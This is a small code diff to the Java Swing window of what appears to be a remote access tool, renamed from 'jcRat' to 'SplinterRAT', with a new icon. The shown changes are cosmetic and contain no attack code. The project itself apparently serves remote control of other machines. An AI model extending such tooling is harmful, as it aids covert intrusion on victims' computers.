@@ -16,6 +16,7 @@ import javax.swing.table.DefaultTableModel;
 import java.awt.*;
 import java.awt.event.MouseAdapter;
 import java.awt.event.MouseEvent;
+import java.util.Objects;
 
 
 public class SplinterGUI {
@@ -35,7 +36,8 @@ public class SplinterGUI {
 
 
     private void setUpFrame() {
-        mainGUI = new JFrame("jcRat Interface");
+        mainGUI = new JFrame("SplinterRAT Interface");
+        mainGUI.setIconImage(new ImageIcon(Objects.requireNonNull(getClass().getClassLoader().getResource("splinter_icon_250x250.png"))).getImage());
         mainGUI.setSize(new Dimension(800, 400));
         mainGUI.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
         mainGUI.setLocationRelativeTo(null);
